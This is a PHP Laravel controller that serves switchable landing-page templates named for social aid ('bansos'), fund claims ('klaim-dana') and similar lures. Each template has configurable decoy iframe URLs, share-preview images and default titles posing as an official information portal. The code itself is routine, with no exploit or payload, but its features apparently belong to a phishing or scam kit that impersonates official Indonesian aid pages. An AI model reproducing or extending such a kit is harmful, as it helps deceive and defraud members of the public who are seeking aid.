<?php

namespace App\Http\Controllers;

use App\Models\Setting;
use App\Services\TemplateService;
use Illuminate\Http\Request;
use Illuminate\View\View;

class LandingController extends Controller
{
    public function index(Request $request, ?string $slug = null): View
    {
        $aliases = [
            'kapan-pulang' => 'gampil',
            'chat' => 'bansos',
            'template' => 'klaim-dana',
        ];

        $rawActive = Setting::get('active_template', 'gampil');
        $activeTemplate = $aliases[$rawActive] ?? $rawActive;

        // Check if slug matches a specific template ID or alias
        if ($slug) {
            $normalizedSlug = $aliases[$slug] ?? $slug;
            if (array_key_exists($normalizedSlug, TemplateService::all())) {
                $selectedTemplate = $normalizedSlug;
            } elseif ($slug === Setting::get('custom_landing_slug', 'gampil') || $normalizedSlug === 'gampil') {
                $selectedTemplate = $activeTemplate;
            } else {
                $selectedTemplate = $activeTemplate;
            }
        } else {
            $selectedTemplate = $activeTemplate;
        }

        $templateInfo = TemplateService::get($selectedTemplate);

        if ($selectedTemplate === 'gampil' || $selectedTemplate === 'kapan-pulang') {
            $siteTitle = Setting::get('site_title', $templateInfo['title'] ?? 'Portal Berita & Informasi Resmi - Gampil Akses');
            $siteDescription = Setting::get('site_description', $templateInfo['preview_description'] ?? 'Baca informasi dan pengumuman resmi terbaru hari ini melalui portal Gampil Akses.');
            $rawOgImage = Setting::get('og_image_url', $templateInfo['og_image'] ?? 'images/landing/default-thumbnail.jpg');
            $decoyIframeUrl = Setting::get('decoy_iframe_url', $templateInfo['decoy_iframe_url'] ?? '');
            $landingHeading = Setting::get('landing_heading', $templateInfo['heading'] ?? 'Portal Informasi & Publikasi Resmi');
            $landingArticleBody = Setting::get('landing_article_body', 'Halaman ini menyajikan informasi dan publikasi resmi terkini. Seluruh konten disaring langsung melalui kanal informasi terpusat guna memberikan pembaruan yang akurat kepada publik.');
        } else {
            $siteTitle = Setting::get("template_{$selectedTemplate}_title", $templateInfo['title'] ?? ($templateInfo['name'] ?? 'Gampil Akses'));
            $siteDescription = Setting::get("template_{$selectedTemplate}_description", $templateInfo['preview_description'] ?? '');
            $rawOgImage = Setting::get("template_{$selectedTemplate}_og_image", $templateInfo['og_image'] ?? 'images/landing/default-thumbnail.jpg');
            $decoyIframeUrl = Setting::get("template_{$selectedTemplate}_decoy_url", $templateInfo['decoy_iframe_url'] ?? '');
            $landingHeading = Setting::get("template_{$selectedTemplate}_heading", $templateInfo['heading'] ?? ($templateInfo['name'] ?? ''));
            $landingArticleBody = Setting::get("template_{$selectedTemplate}_article_body", '');
        }

        $ogImageUrl = (str_starts_with($rawOgImage, 'http://') || str_starts_with($rawOgImage, 'https://'))
            ? $rawOgImage
            : url($rawOgImage);

        // View path
        $viewName = "landing.templates.{$selectedTemplate}";
        if (!view()->exists($viewName)) {
            $viewName = "landing.templates.gampil";
        }

        return view($viewName, compact(
            'siteTitle',
            'siteDescription',
            'ogImageUrl',
            'decoyIframeUrl',
            'landingHeading',
            'landingArticleBody',
            'selectedTemplate',
            'templateInfo'
        ));
    }
}
